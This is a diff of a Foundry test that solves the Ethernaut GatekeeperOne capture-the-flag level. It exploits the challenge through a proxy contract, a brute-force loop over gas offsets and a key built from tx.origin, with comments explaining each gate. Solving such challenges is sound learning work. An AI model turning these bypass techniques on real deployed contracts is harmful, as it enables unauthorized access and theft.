@@ -4,66 +4,44 @@ pragma solidity >=0.8.0;
 import "forge-std/Test.sol";
 import "../utils.sol";
 
-// ?
-import 'openzeppelin-contracts/contracts/utils/math/SafeMath.sol';
-
-contract GatekeeperOne {
-
-  using SafeMath for uint256;
-  address public entrant;
-
-  modifier gateOne() {
-    require(msg.sender != tx.origin);
-    _;
-  }
-
-  modifier gateTwo() {
-    require(gasleft().mod(8191) == 0);
-    console.log("MARK TWAIN");
-    _;
-  }
-
-  modifier gateThree(bytes8 _gateKey) {
-    require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
-    require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
-    require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
-    _;
-  }
-
-  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
-    console.log("muy bien");
-    entrant = tx.origin;
-    return true;
-  }
-}
-
 contract Proxy {
-  function enter(address _gateKeeperAddress, bytes8 _key) external {
-    (bool success,) = _gateKeeperAddress.call(abi.encodeWithSignature("enter(bytes8)", _key));
-    if (!success) revert();
+  address internal challengeAddress;
+
+  constructor(address _challengeAddress) {
+    challengeAddress = _challengeAddress;
+  }
+
+  function enter(bytes8 _key) external returns (bool) {
+    (bool success,) = challengeAddress.call(abi.encodeWithSignature("enter(bytes8)", _key));
+    return success;
   }
 }
 
 contract GatekeeperOneTest is Test {
+  address internal factoryAddress;
   address internal challengeAddress;
 
   function setUp() public {
-    // challengeAddress = utils.createLevelInstance(0x9b261b23cE149422DE75907C6ac0C30cEc4e652A);
+    // for this challenge, player needs to be tx.origin
+    // let's skip the middleman just this time.
+    factoryAddress = 0x9b261b23cE149422DE75907C6ac0C30cEc4e652A;
+    (,bytes memory data) =
+      factoryAddress.call(
+        abi.encodeWithSignature("createInstance(address)", tx.origin));
+
+    challengeAddress = abi.decode(data, (address));
   }
 
   function testExploit() public {
-    // ?
-    GatekeeperOne gk1 = new GatekeeperOne();
-
     // gateOne
     //   is passed through by using a proxy contract
     //
     // gateTwo
-    //   build a simpler contract, and run an iteration
-    //   of  `.call{gas: (8191 * 5) + i}` to find `i`
+    //   just brute force it
+    //   ee are running in a fork
     //
     // gateThree
-    //   just console.log() the operations on 0x1122334455667788
+    //   console.log() the operations on 0x1122334455667788
     //   use your fav REPL to get the hex conversions
     //
     //    uint32(uint64(_gateKey))   -> 0x1122334455667788 => 0x55667788
@@ -80,12 +58,18 @@ contract GatekeeperOneTest is Test {
 
     bytes8 key = bytes8(uint16(uint160(tx.origin)) + 0x1000000000000000);
 
-    Proxy proxy = new Proxy();
-    proxy.enter{gas: (8191 * 5) + 1577}(address(gk1), key);
+    Proxy proxy = new Proxy(challengeAddress);
 
-
-
-
-    // utils.submitLevelInstance(challengeAddress);
+    for (uint i = 0; i < 8191; i++) {
+      bool success = proxy.enter{gas: (8191 * 3) + i}(key);
+      if (success) {
+        (,bytes memory data) =
+          factoryAddress.call(
+            abi.encodeWithSignature("validateInstance(address,address)", challengeAddress, tx.origin));
+        bool instanceValid = abi.decode(data, (bool));
+        require(instanceValid);
+        break;
+      }
+    }
   }
 }
